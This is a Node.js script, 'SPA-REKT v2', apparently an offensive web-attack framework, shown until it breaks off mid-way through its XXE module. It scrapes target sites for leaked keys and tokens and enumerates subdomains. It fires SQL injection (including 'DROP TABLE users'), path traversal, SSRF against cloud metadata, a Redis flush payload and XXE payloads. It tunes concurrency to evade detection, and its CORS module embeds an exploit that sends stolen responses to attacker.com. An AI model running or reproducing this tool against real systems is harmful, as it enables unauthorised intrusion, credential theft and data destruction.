#!/usr/bin/env node
// language: Node.js  file: rekt.js  v2
// SPA-REKT v2 — full-spectrum web security research framework
// modules: ripper | endpoint-harvester | secret-extractor | vuln-scanner |
//          backend-attacker | sqli | cmdi | traversal | ssrf | xxe |
//          subdomain-enum | graphql-dump | param-fuzzer | sourcemap-rip |
//          ws-detector | waf-detect | data-harvester | tech-fingerprint

"use strict";
const https  = require("node:https");
const http   = require("node:http");
const fs     = require("node:fs");
const path   = require("node:path");
const crypto = require("node:crypto");
const dns    = require("node:dns").promises;
const { URL } = require("node:url");

// ─── CLI ────────────────────────────────────────────────────────────────────
const ARGV   = process.argv.slice(2);
const TARGET = ARGV.find(a => a.startsWith("http")) || (() => { console.error("Usage: node rekt.js <url> [--all] [flags]"); process.exit(1); })();
const OPT = {
  out:       ARGV.find(a => a.startsWith("--out="))?.slice(6)      || `rekt-output/${new URL(TARGET).hostname}`,
  all:       ARGV.includes("--all"),
  deep:      ARGV.includes("--deep")      || ARGV.includes("--all"),
  vuln:      ARGV.includes("--vuln")      || ARGV.includes("--all"),
  secrets:   ARGV.includes("--secrets")   || ARGV.includes("--all"),
  cors:      ARGV.includes("--cors")      || ARGV.includes("--all"),
  auth:      ARGV.includes("--auth")      || ARGV.includes("--all"),
  sqli:      ARGV.includes("--sqli")      || ARGV.includes("--all"),
  traversal: ARGV.includes("--traversal") || ARGV.includes("--all"),
  ssrf:      ARGV.includes("--ssrf")      || ARGV.includes("--all"),
  xxe:       ARGV.includes("--xxe")       || ARGV.includes("--all"),
  graphql:   ARGV.includes("--graphql")   || ARGV.includes("--all"),
  fuzz:      ARGV.includes("--fuzz")      || ARGV.includes("--all"),
  sourcemap: ARGV.includes("--sourcemap") || ARGV.includes("--all"),
  subdomains:ARGV.includes("--subs")      || ARGV.includes("--all"),
  waf:       ARGV.includes("--waf")       || ARGV.includes("--all"),
  ws:        ARGV.includes("--ws")        || ARGV.includes("--all"),
  harvest:   ARGV.includes("--harvest")   || ARGV.includes("--all"),
  threads:   parseInt(ARGV.find(a => a.startsWith("--threads="))?.slice(10) || "10"),
  delay:     parseInt(ARGV.find(a => a.startsWith("--delay="))?.slice(8)    || "0"),
  ua:        ARGV.find(a => a.startsWith("--ua="))?.slice(5) ||
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
  cookie:    ARGV.find(a => a.startsWith("--cookie="))?.slice(9) || "",
  token:     ARGV.find(a => a.startsWith("--token="))?.slice(8)  || "",
  wordlist:  ARGV.find(a => a.startsWith("--wordlist="))?.slice(11) || "",
};

const BASE   = new URL(TARGET);
const HOST   = BASE.hostname;
const ORIGIN = BASE.origin;

fs.mkdirSync(OPT.out, { recursive: true });
fs.mkdirSync(path.join(OPT.out, "assets"),   { recursive: true });
fs.mkdirSync(path.join(OPT.out, "sourcemaps"),{ recursive: true });
fs.mkdirSync(path.join(OPT.out, "harvested"),{ recursive: true });

const C = {
  reset:"\x1b[0m", red:"\x1b[31m", green:"\x1b[32m",
  yellow:"\x1b[33m", cyan:"\x1b[36m", magenta:"\x1b[35m", bold:"\x1b[1m"
};
const log  = (...a) => console.log(`${C.cyan}[REKT]${C.reset}`, ...a);
const warn = (...a) => console.log(`${C.yellow}[WARN]${C.reset}`, ...a);
const hit  = (...a) => console.log(`${C.green}[HIT]${C.reset}`,  ...a);
const vuln = (...a) => console.log(`${C.red}${C.bold}[VULN]${C.reset}`, ...a);
const sec  = (...a) => console.log(`${C.magenta}[SECRET]${C.reset}`, ...a);

const REPORT = {
  target: TARGET, timestamp: new Date().toISOString(),
  tech: {}, waf: null,
  assets: [], endpoints: [], secrets: [], vulns: [],
  cors: [], authSurface: [], cookies: [], headers: {},
  subdomains: [], graphql: null, sourcemaps: [],
  harvested: [], wsEndpoints: [], params: [],
};

// ─── HTTP ────────────────────────────────────────────────────────────────────
function fetch(targetUrl, opts = {}) {
  return new Promise((resolve, reject) => {
    let parsed;
    try { parsed = new URL(targetUrl); } catch(e) { return reject(e); }
    const mod = parsed.protocol === "https:" ? https : http;
    const body = opts.body ? (typeof opts.body === "string" ? opts.body : JSON.stringify(opts.body)) : null;
    const reqOpts = {
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method: opts.method || "GET",
      headers: {
        "User-Agent":      opts.ua || OPT.ua,
        "Accept":          opts.accept || "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer":         ORIGIN + "/",
        "Origin":          ORIGIN,
        ...(OPT.cookie ? { "Cookie": OPT.cookie }          : {}),
        ...(OPT.token  ? { "Authorization": `Bearer ${OPT.token}` } : {}),
        ...(body ? { "Content-Type": opts.ct || "application/json", "Content-Length": Buffer.byteLength(body) } : {}),
        ...(opts.headers || {}),
      },
      rejectUnauthorized: false,
    };
    const req = mod.request(reqOpts, res => {
      const chunks = [];
      res.on("data", c => chunks.push(c));
      res.on("end", () => {
        const buf = Buffer.concat(chunks);
        resolve({ status: res.statusCode, headers: res.headers, body: buf, text: buf.toString("utf8") });
      });
    });
    req.on("error", reject);
    req.setTimeout(opts.timeout || 10000, () => req.destroy(new Error("timeout")));
    if (body) req.write(body);
    req.end();
  });
}
async function safe(u, opts={}) {
  try { return await fetch(u, opts); }
  catch(e) { return { status:0, headers:{}, body:Buffer.alloc(0), text:"", error:e.message }; }
}
const sleep = ms => new Promise(r => setTimeout(r, ms));
async function pool(tasks, limit=OPT.threads) {
  const results=[], q=[...tasks];
  await Promise.all(Array.from({length:Math.min(limit,q.length)}, async()=>{
    while(q.length){ results.push(await q.shift()().catch(e=>({error:e.message}))); if(OPT.delay) await sleep(OPT.delay); }
  }));
  return results;
}

// ─── PHASE 1: TECH FINGERPRINT ───────────────────────────────────────────────
async function fingerprint() {
  log("Fingerprinting technology stack...");
  const res = await safe(TARGET);
  REPORT.headers = res.headers;
  const h = res.headers;
  const body = res.text;
  const tech = {};

  // Server / framework
  if (h.server)          tech.server     = h.server;
  if (h["x-powered-by"]) tech.poweredBy  = h["x-powered-by"];
  if (h["x-generator"])  tech.generator  = h["x-generator"];
  if (h["x-drupal-cache"]) tech.cms = "Drupal";
  if (h["x-pingback"])   tech.cms = "WordPress";

  // Body signals
  const signals = [
    [/wp-content/i,         "cms",       "WordPress"],
    [/Joomla/i,             "cms",       "Joomla"],
    [/drupal\.js/i,         "cms",       "Drupal"],
    [/__NEXT_DATA__/,       "framework", "Next.js"],
    [/nuxt/i,               "framework", "Nuxt.js"],
    [/__reactFiber/,        "framework", "React"],
    [/angular\.min\.js/,   "framework", "Angular"],
    [/vue\.global\.js/,    "framework", "Vue.js"],
    [/"svelte"/,            "framework", "Svelte"],
    [/vite\/client/,        "build",     "Vite"],
    [/webpack/,             "build",     "Webpack"],
    [/__cf_beacon/,         "infra",     "Cloudflare"],
    [/cloudflare-static/,   "infra",     "Cloudflare"],
    [/cdn\.jsdelivr\.net/,  "cdn",       "jsDelivr"],
    [/unpkg\.com/,          "cdn",       "unpkg"],
    [/stripe\.com/,         "payment",   "Stripe"],
    [/firebase/i,           "backend",   "Firebase"],
    [/supabase/i,           "backend",   "Supabase"],
    [/graphql/i,            "api",       "GraphQL"],
    [/apollo/i,             "api",       "Apollo"],
    [/fastapi/i,            "backend",   "FastAPI"],
    [/express/i,            "backend",   "Express.js"],
    [/laravel/i,            "backend",   "Laravel"],
    [/rails/i,              "backend",   "Ruby on Rails"],
    [/django/i,             "backend",   "Django"],
  ];
  for (const [re, cat, name] of signals) {
    if (re.test(body)) { tech[cat] = tech[cat] ? `${tech[cat]}, ${name}` : name; }
  }

  REPORT.tech = tech;
  Object.entries(tech).forEach(([k,v]) => hit(`  ${k}: ${v}`));
  return { html: body, headers: h };
}

// ─── PHASE 2: WAF DETECTION ──────────────────────────────────────────────────
async function detectWAF() {
  if (!OPT.waf) return;
  log("Detecting WAF...");
  // Send a payload that triggers most WAFs
  const payload = `/?q=<script>alert(1)</script>&id=1' OR '1'='1&cmd=;id`;
  const res = await safe(ORIGIN + payload);
  const body = res.text.toLowerCase();
  const hdr  = JSON.stringify(res.headers).toLowerCase();

  const wafs = [
    ["Cloudflare",     /cf-ray|cloudflare|attention required.*cloudflare/],
    ["AWS WAF",        /aws-waf|x-amzn-waf/],
    ["Akamai",         /akamai|reference #\d+\.\d+/],
    ["Imperva",        /incapsula|x-iinfo|visitorid/],
    ["F5 BIG-IP ASM",  /bigip|f5|ts\d{8}/],
    ["Sucuri",         /sucuri|x-sucuri/],
    ["ModSecurity",    /mod_security|modsecurity|naxsi/],
    ["Barracuda",      /barracuda|barra_counter_session/],
    ["Wordfence",      /wordfence/],
    ["Fastly",         /fastly-restarts|x-fastly/],
  ];

  let detected = null;
  for (const [name, re] of wafs) {
    if (re.test(body + hdr)) {
      detected = name;
      vuln(`WAF detected: ${name} (status ${res.status})`);
      break;
    }
  }
  if (!detected && res.status === 403) warn("Unknown WAF/block rule (403 on attack payload)");
  REPORT.waf = detected || (res.status === 403 ? "Unknown (403)" : "None detected");
}

// ─── PHASE 3: ASSET RIPPING ──────────────────────────────────────────────────
async function ripAssets(html) {
  log("Ripping all assets...");
  const refs = new Set();
  for (const m of html.matchAll(/(?:src|href)=["']([^"']+)["']/g))       refs.add(m[1]);
  for (const m of html.matchAll(/modulepreload[^>]+href=["']([^"']+)["']/g)) refs.add(m[1]);
  for (const m of html.matchAll(/url\(["']?([^)"']+)["']?\)/g))           refs.add(m[1]);

  const toFetch = [...refs].map(r =>
    r.startsWith("http") ? r : ORIGIN + (r.startsWith("/") ? r : "/" + r)
  ).filter(u => { try { return new URL(u).hostname === HOST; } catch { return false; } });

  fs.writeFileSync(path.join(OPT.out, "index.html"), html);
  REPORT.assets.push({ url: TARGET, type: "html", size: html.length });

  const tasks = [...new Set(toFetch)].map(url => async () => {
    const r = await safe(url);
    if (!r.status || r.status >= 400) return;
    const rel  = new URL(url).pathname.replace(/^\//, "");
    const dest = path.join(OPT.out, rel);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, r.body);
    REPORT.assets.push({ url, size: r.body.length });
    hit(`  ${r.status} ${rel} (${r.body.length}b)`);
  });
  await pool(tasks);
}

// ─── PHASE 4: SOURCE MAP EXTRACTION ─────────────────────────────────────────
async function extractSourceMaps() {
  if (!OPT.sourcemap) return;
  log("Hunting source maps...");
  const jsFiles = fs.readdirSync(path.join(OPT.out, "assets"))
    .filter(f => f.endsWith(".js"))
    .map(f => ({ name: f, path: path.join(OPT.out, "assets", f) }));

  for (const { name, path: p } of jsFiles) {
    const content = fs.readFileSync(p, "utf8");
    // Check for sourceMappingURL comment
    const m = content.match(/\/\/[#@]\s*sourceMappingURL=([^\s]+)/);
    if (!m) continue;
    const mapRef = m[1];
    let mapUrl;
    if (mapRef.startsWith("data:")) {
      // Inline base64 source map
      const b64 = mapRef.split(",")[1];
      const mapJson = Buffer.from(b64, "base64").toString("utf8");
      const mapDest = path.join(OPT.out, "sourcemaps", name + ".map");
      fs.writeFileSync(mapDest, mapJson);
      hit(`  Inline sourcemap: ${name} → ${mapDest}`);
      REPORT.sourcemaps.push({ file: name, type: "inline", dest: mapDest });
      // Extract original sources
      try {
        const parsed = JSON.parse(mapJson);
        if (parsed.sources && parsed.sourcesContent) {
          const srcDir = path.join(OPT.out, "sourcemaps", name + "-sources");
          fs.mkdirSync(srcDir, { recursive: true });
          parsed.sources.forEach((src, i) => {
            const safeP = src.replace(/[<>:"|?*]/g, "_").replace(/\.\.\//g, "_/");
            const dest2 = path.join(srcDir, safeP);
            fs.mkdirSync(path.dirname(dest2), { recursive: true });
            fs.writeFileSync(dest2, parsed.sourcesContent[i] || "");
          });
          hit(`  Extracted ${parsed.sources.length} original source files from ${name}`);
        }
      } catch {}
      continue;
    }

    mapUrl = mapRef.startsWith("http") ? mapRef : `${ORIGIN}/assets/${mapRef}`;
    const res = await safe(mapUrl);
    if (res.status !== 200) continue;
    const mapDest = path.join(OPT.out, "sourcemaps", name + ".map");
    fs.writeFileSync(mapDest, res.text);
    hit(`  Sourcemap: ${mapUrl} → ${mapDest}`);
    REPORT.sourcemaps.push({ file: name, url: mapUrl, dest: mapDest });

    // Extract and reconstruct original source files
    try {
      const parsed = JSON.parse(res.text);
      if (parsed.sources && parsed.sourcesContent) {
        const srcDir = path.join(OPT.out, "sourcemaps", name + "-sources");
        fs.mkdirSync(srcDir, { recursive: true });
        parsed.sources.forEach((src, i) => {
          if (!parsed.sourcesContent[i]) return;
          const safeP = src.replace(/[<>:"|?*]/g, "_").replace(/\.\.\//g, "_/");
          const dest2 = path.join(srcDir, safeP);
          fs.mkdirSync(path.dirname(dest2), { recursive: true });
          fs.writeFileSync(dest2, parsed.sourcesContent[i]);
        });
        hit(`  Reconstructed ${parsed.sources.length} source files from ${name}`);
      }
    } catch {}
  }

  // Also check .map files directly
  const mapCandidates = [
    `/assets/main.js.map`, `/static/js/main.chunk.js.map`,
    `/app.js.map`, `/bundle.js.map`, `/dist/bundle.js.map`,
  ];
  for (const mp of mapCandidates) {
    const r = await safe(ORIGIN + mp);
    if (r.status === 200 && r.text.includes("sources")) {
      const dest = path.join(OPT.out, "sourcemaps", mp.replace(/\//g,"_"));
      fs.writeFileSync(dest, r.text);
      hit(`  Public sourcemap at ${mp}`);
      REPORT.sourcemaps.push({ url: ORIGIN + mp, dest });
      REPORT.vulns.push({ type: "Exposed Source Map", severity: "HIGH", url: ORIGIN + mp,
        detail: "Source map publicly accessible — full original source code recoverable." });
    }
  }
}

// ─── PHASE 5: JS BUNDLE MINING ───────────────────────────────────────────────
const EP_PATTERNS = [
  /["'`](\/api\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/v\d+\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/auth\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/graphql[a-zA-Z0-9\-_\/?.=&%{}:]*)["'`]/g,
  /["'`](\/internal\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/admin\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/ws\/[a-zA-Z0-9\-_\/?.=&%]+)["'`]/g,
  /fetch\(["'`](\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /axios\.[a-z]+\(["'`](\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /`(\/(?:api|auth|v\d+|user|admin|internal|graphql)[^`]{1,150})`/g,
];

const SECRET_PATTERNS = [
  { name:"API Key",         re:/(?:api[_-]?key|apikey)\s*[:=]\s*["'`]([A-Za-z0-9\-_]{16,64})["'`]/gi },
  { name:"JWT",             re:/eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/g },
  { name:"Bearer Token",    re:/bearer\s+([A-Za-z0-9\-_.~+/]+=*)/gi },
  { name:"AWS Key",         re:/AKIA[0-9A-Z]{16}/g },
  { name:"AWS Secret",      re:/(?:aws.secret|secret.access.key)\s*[:=]\s*["'`]([A-Za-z0-9/+=]{40})["'`]/gi },
  { name:"Stripe Key",      re:/(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}/g },
  { name:"SendGrid",        re:/SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}/g },
  { name:"Slack Token",     re:/xox[baprs]-[A-Za-z0-9\-]+/g },
  { name:"GH Token",        re:/gh[pousr]_[A-Za-z0-9]{36}/g },
  { name:"Private Key",     re:/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g },
  { name:"Password",        re:/(?:password|passwd|secret)\s*[:=]\s*["'`]([^"'`\s]{8,64})["'`]/gi },
  { name:"Token",           re:/(?:access_token|refresh_token|id_token)\s*[:=]\s*["'`]([A-Za-z0-9\-_.]{20,300})["'`]/gi },
  { name:"Firebase",        re:/firebaseConfig\s*=\s*\{[^}]+\}/gs },
  { name:"Sentry DSN",      re:/https:\/\/[a-f0-9]+@o\d+\.ingest\.sentry\.io\/\d+/g },
  { name:"Twilio",          re:/AC[a-f0-9]{32}/g },
  { name:"Internal IP",     re:/\b(?:10\.|172\.1[6-9]\.|172\.2\d\.|172\.3[01]\.|192\.168\.)\d+\.\d+\b/g },
  { name:"Webhook",         re:/https:\/\/hooks\.[a-z]+\.[a-z]+\/[A-Za-z0-9\-_/]+/g },
  { name:"GraphQL EP",      re:/["'`](https?:\/\/[^"'`]+\/graphql[^"'`]*)["'`]/gi },
  { name:"Embedded Creds",  re:/https?:\/\/[^:@\s]+:[^@\s]+@[^\s"'`]+/g },
  { name:"Cloudflare Token",re:/(?:cf[_-]?token|cloudflare[_-]?token)\s*[:=]\s*["'`]([A-Za-z0-9\-_]{32,64})["'`]/gi },
  { name:"SMTP Creds",      re:/(?:smtp|mail).*?(?:user|pass)\s*[:=]\s*["'`]([^"'`\s]{4,64})["'`]/gi },
];

function mineBundle(content, src) {
  const endpoints = new Set();
  for (const re of EP_PATTERNS) {
    re.lastIndex = 0;
    for (const m of content.matchAll(re)) {
      const ep = (m[1]||m[0]).trim();
      if (ep.length > 2 && ep.length < 200) endpoints.add(ep);
    }
  }
  for (const ep of endpoints) REPORT.endpoints.push({ endpoint: ep, source: path.basename(src) });

  for (const { name, re } of SECRET_PATTERNS) {
    re.lastIndex = 0;
    for (const m of content.matchAll(re)) {
      const val = (m[1]||m[0]).slice(0,150);
      REPORT.secrets.push({ type: name, value: val, source: path.basename(src) });
      sec(`${name}: ${val.slice(0,70)}  [${path.basename(src)}]`);
    }
  }

  // WebSocket detection
  for (const m of content.matchAll(/["'`](wss?:\/\/[^"'`\s]+)["'`]/g)) {
    REPORT.wsEndpoints.push({ url: m[1], source: path.basename(src) });
    hit(`WS endpoint: ${m[1]}`);
  }
  for (const m of content.matchAll(/new WebSocket\(["'`]([^"'`]+)["'`]/g)) {
    REPORT.wsEndpoints.push({ url: m[1], source: path.basename(src) });
    hit(`WS: ${m[1]}`);
  }
}

async function mineAll() {
  log("Mining all JS bundles...");
  const jsFiles = fs.readdirSync(path.join(OPT.out, "assets"))
    .filter(f => f.endsWith(".js"))
    .map(f => path.join(OPT.out, "assets", f));
  const htmlPath = path.join(OPT.out, "index.html");
  if (fs.existsSync(htmlPath)) jsFiles.push(htmlPath);

  for (const f of jsFiles) {
    try { mineBundle(fs.readFileSync(f, "utf8"), f); } catch {}
  }
  const unique = [...new Set(REPORT.endpoints.map(e => e.endpoint))];
  log(`  Endpoints: ${unique.length}  |  Secrets: ${REPORT.secrets.length}  |  WS: ${REPORT.wsEndpoints.length}`);
}

// ─── PHASE 6: SUBDOMAIN ENUM ─────────────────────────────────────────────────
const COMMON_SUBS = [
  "www","api","app","admin","dev","staging","test","beta","mail","smtp",
  "cdn","static","assets","img","media","upload","files","docs","blog",
  "shop","store","portal","dashboard","manage","secure","auth","login",
  "register","account","user","users","m","mobile","wap","v1","v2","v3",
  "internal","intranet","vpn","remote","ftp","ssh","git","gitlab","jenkins",
  "ci","cd","db","mysql","redis","mongo","elastic","kibana","grafana",
  "api-v1","api-v2","api-dev","api-staging","ws","websocket","socket",
  "graphql","gql","rest","backend","server","services","microservice",
  "payments","billing","status","monitor","metrics","analytics","data",
];

async function enumSubdomains() {
  if (!OPT.subdomains) return;
  log(`Enumerating subdomains of ${HOST}...`);
  const base = HOST.split(".").slice(-2).join(".");
  const tasks = COMMON_SUBS.map(sub => async () => {
    const fqdn = `${sub}.${base}`;
    try {
      const addrs = await dns.resolve4(fqdn);
      hit(`  ${fqdn} → ${addrs[0]}`);
      REPORT.subdomains.push({ subdomain: fqdn, ip: addrs[0] });
      // Quick HTTP probe
      const r = await safe(`https://${fqdn}/`, { timeout: 5000 });
      if (r.status) REPORT.subdomains[REPORT.subdomains.length-1].status = r.status;
    } catch {}
  });
  await pool(tasks, 30);

  // Certificate Transparency via crt.sh
  try {
    const r = await safe(`https://crt.sh/?q=%25.${base}&output=json`);
    if (r.status === 200) {
      const certs = JSON.parse(r.text);
      const ctSubs = [...new Set(certs.map(c => c.name_value).flatMap(n => n.split("\n")))];
      for (const s of ctSubs) {
        if (!REPORT.subdomains.find(d => d.subdomain === s)) {
          hit(`  CT log: ${s}`);
          REPORT.subdomains.push({ subdomain: s, source: "crt.sh" });
        }
      }
    }
  } catch {}

  log(`  Found ${REPORT.subdomains.length} subdomains`);
}

// ─── PHASE 7: CORS SCAN ──────────────────────────────────────────────────────
const CORS_ORIGINS = [
  "https://evil.com", "https://attacker.com", "null",
  `https://${HOST}.evil.com`, `https://evil${HOST}`,
  "http://localhost:1337", "https://www.google.com",
];
async function scanCORS() {
  if (!OPT.cors) return;
  log("Scanning CORS...");
  const endpoints = [...new Set(REPORT.endpoints.map(e=>e.endpoint))].slice(0,30)
    .map(e => ORIGIN + e.split("{")[0]);

  for (const url of [ORIGIN + "/api/auth/me", ORIGIN + "/api/me", ...endpoints]) {
    for (const origin of CORS_ORIGINS) {
      const r = await safe(url, { headers: { "Origin": origin } });
      const acao = r.headers["access-control-allow-origin"];
      const acac = r.headers["access-control-allow-credentials"];
      if (!acao) continue;
      if (acao === "*")                     { vuln(`CORS wildcard at ${url}`); REPORT.cors.push({ type:"wildcard", url, origin, acao }); }
      if (acao === origin && acac==="true") { vuln(`CORS reflect+creds at ${url} [${origin}]`);
        REPORT.cors.push({ type:"reflect+creds", url, origin, acao });
        REPORT.vulns.push({ type:"CORS Reflect+Credentials", severity:"CRITICAL", url,
          exploit: `fetch("${url}",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://attacker.com/?d="+encodeURIComponent(d)))` }); }
      if (origin==="null" && acao==="null") { vuln(`CORS null-origin at ${url}`);
        REPORT.vulns.push({ type:"CORS Null Origin", severity:"HIGH", url,
          exploit: `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('${url}',{credentials:'include'}).then(r=>r.text()).then(d=>top.postMessage(d,'*'))<\/script>"></iframe>` }); }
    }
  }
}

// ─── PHASE 8: SQL INJECTION ──────────────────────────────────────────────────
const SQLI_PAYLOADS = [
  "'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
  "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
  "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
  "1 UNION SELECT NULL,NULL,NULL--",
  "' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
  "1; DROP TABLE users--", "admin'--", "admin'/*",
  "' OR 'x'='x", "' AND 1=0--", "') OR ('1'='1",
  "1' AND (SELECT * FROM (SELECT(SLEEP(3)))x)--",
];

const SQLI_ERROR_SIGNATURES = [
  /SQL syntax.*MySQL/i, /Warning.*mysql_/i, /valid MySQL result/i,
  /MySQLSyntaxErrorException/i, /check the manual that corresponds to your MySQL/i,
  /ORA-\d{4,5}/i, /Oracle error/i, /Oracle.*Driver/i,
  /SQLServer JDBC Driver/i, /\[Microsoft\]\[ODBC SQL Server/i,
  /Unclosed quotation mark/i, /mssql_query\(/i,
  /PostgreSQL.*ERROR/i, /pg_query\(\)/i,
  /SQLite\/JDBCDriver/i, /SQLite\.Exception/i,
  /System\.Data\.SQLite/i, /sqlite3\.OperationalError/i,
  /\bException\b.*\bSQL\b/i, /Syntax error.*in query/i,
  /DB2 SQL error/i, /Sybase message/i,
];

async function sqliProbe(url, param) {
  const base = await safe(url);
  if (!base.status) return;
  const baseTime = Date.now();

  for (const payload of SQLI_PAYLOADS) {
    const testUrl = `${url}${url.includes("?") ? "&" : "?"}${param}=${encodeURIComponent(payload)}`;
    const t0 = Date.now();
    const r = await safe(testUrl);
    const elapsed = Date.now() - t0;

    // Error-based detection
    for (const re of SQLI_ERROR_SIGNATURES) {
      if (re.test(r.text)) {
        vuln(`SQLi error-based: ${url} param=${param} payload=${payload}`);
        REPORT.vulns.push({ type:"SQL Injection (Error-Based)", severity:"CRITICAL",
          url: testUrl, payload, detail: r.text.match(re)?.[0] });
        return true;
      }
    }
    // Time-based detection
    if (/SLEEP|WAITFOR/.test(payload) && elapsed > 2500) {
      vuln(`SQLi time-based: ${url} param=${param} delay=${elapsed}ms`);
      REPORT.vulns.push({ type:"SQL Injection (Time-Based)", severity:"CRITICAL",
        url: testUrl, payload, elapsed });
      return true;
    }
  }
  return false;
}

async function scanSQLi() {
  if (!OPT.sqli) return;
  log("Probing SQL injection...");
  const endpoints = [...new Set(REPORT.endpoints.map(e=>e.endpoint))].slice(0,50);
  const commonParams = ["id","user","username","email","search","q","query","name","page","cat","category","sort","filter","type","format","token","key","ref","url","redirect","next","return","callback","lang","locale","year","month","day","limit","offset","cursor"];

  const tasks = endpoints.flatMap(ep =>
    commonParams.map(p => async () => sqliProbe(ORIGIN + ep.split("{")[0], p))
  );
  await pool(tasks, 5); // low concurrency to avoid detection
}

// ─── PHASE 9: PATH TRAVERSAL ──────────────────────────────────────────────────
const TRAVERSAL_PAYLOADS = [
  "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
  "....//....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
  "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
  "..\\..\\..\\windows\\win.ini", "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
  "/etc/passwd", "/etc/shadow", "/proc/self/environ",
  "/proc/self/cmdline", "/var/log/apache2/access.log",
  "C:\\Windows\\win.ini", "C:\\boot.ini",
  "../../../../../../../../etc/passwd%00.jpg",
];

async function scanTraversal() {
  if (!OPT.traversal) return;
  log("Testing path traversal...");
  const fileParams = ["file","path","dir","page","doc","document","template","view","load","include","require","read","name","filename","content","source"];

  const endpoints = [...new Set(REPORT.endpoints.map(e=>e.endpoint))].slice(0,30);

  for (const ep of endpoints) {
    for (const param of fileParams) {
      for (const payload of TRAVERSAL_PAYLOADS.slice(0,5)) {
        const url = `${ORIGIN}${ep.split("{")[0]}?${param}=${encodeURIComponent(payload)}`;
        const r = await safe(url);
        if (/root:.*:0:0:|daemon:|nobody:/i.test(r.text) ||
            /\[boot loader\]|for 16-bit app support/i.test(r.text) ||
            /\[fonts\].*\[extensions\]/i.test(r.text)) {
          vuln(`Path traversal! ${url}`);
          REPORT.vulns.push({ type:"Path Traversal", severity:"CRITICAL",
            url, payload, detail: r.text.slice(0,300) });
        }
      }
    }
  }
}

// ─── PHASE 10: SSRF ──────────────────────────────────────────────────────────
const SSRF_PAYLOADS = [
  "http://169.254.169.254/latest/meta-data/",          // AWS IMDS
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://metadata.google.internal/computeMetadata/v1/", // GCP
  "http://100.100.100.200/latest/meta-data/",           // Alibaba Cloud
  "http://localhost:22", "http://localhost:3306",
  "http://localhost:6379", "http://localhost:27017",     // Redis/Mongo
  "http://0.0.0.0:80", "http://127.0.0.1/admin",
  "http://[::]:80/", "http://[::1]/",
  "file:///etc/passwd", "file:///C:/Windows/win.ini",
  "dict://localhost:6379/info",
  "gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
];

const SSRF_PARAMS = ["url","uri","path","dest","destination","redirect","next","target","proxy","callback","return","image","img","src","source","feed","host","server","endpoint","domain","site","link","href","ref","reference","load","fetch","request","download","open","window","data"];

async function scanSSRF() {
  if (!OPT.ssrf) return;
  log("Probing SSRF...");
  const endpoints = [...new Set(REPORT.endpoints.map(e=>e.endpoint))].slice(0,40);

  for (const ep of endpoints) {
    for (const param of SSRF_PARAMS.slice(0,8)) {
      for (const payload of SSRF_PAYLOADS.slice(0,3)) {
        const url = `${ORIGIN}${ep.split("{")[0]}?${param}=${encodeURIComponent(payload)}`;
        const r = await safe(url, { timeout: 6000 });
        // AWS IMDS response detection
        if (/ami-id|instance-id|iam\/security-credentials/i.test(r.text)) {
          vuln(`SSRF → AWS metadata! ${url}`);
          fs.writeFileSync(path.join(OPT.out, "harvested", "ssrf-aws-meta.txt"), r.text);
          REPORT.vulns.push({ type:"SSRF → Cloud Metadata", severity:"CRITICAL",
            url, payload, detail: r.text.slice(0,500) });
        } else if (/computeMetadata|serviceaccounts/i.test(r.text)) {
          vuln(`SSRF → GCP metadata! ${url}`);
          REPORT.vulns.push({ type:"SSRF → GCP Metadata", severity:"CRITICAL", url, payload });
        } else if (r.status === 200 && payload.includes("localhost") && r.body.length > 0) {
          warn(`Potential SSRF: ${url} (${r.body.length}b response)`);
          REPORT.vulns.push({ type:"Potential SSRF", severity:"HIGH", url, payload });
        }
      }
    }
  }
}

// ─── PHASE 11: XXE ───────────────────────────────────────────────────────────
const XXE_PAYLOADS = [
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
];

async function scanXXE() {
  if (!OPT.xxe) return;
  log("Probing XXE...");
  const xmlEndpoints = REPORT.endpoints
    .filter(e => /xml|soap|rpc|upload|import|parse/i.test(e.endpoint))
    .map(e => e.endpoint.split("{")[0])
    .slice(0,10);

  for (const ep of xmlEndpoints) {
    for (const payload of XXE_PAYLOADS) {
      const r = await safe(ORIGIN + ep, {
        method: "POST", body: payload,
        headers: { "Content-Type": "application/xml" },
      });
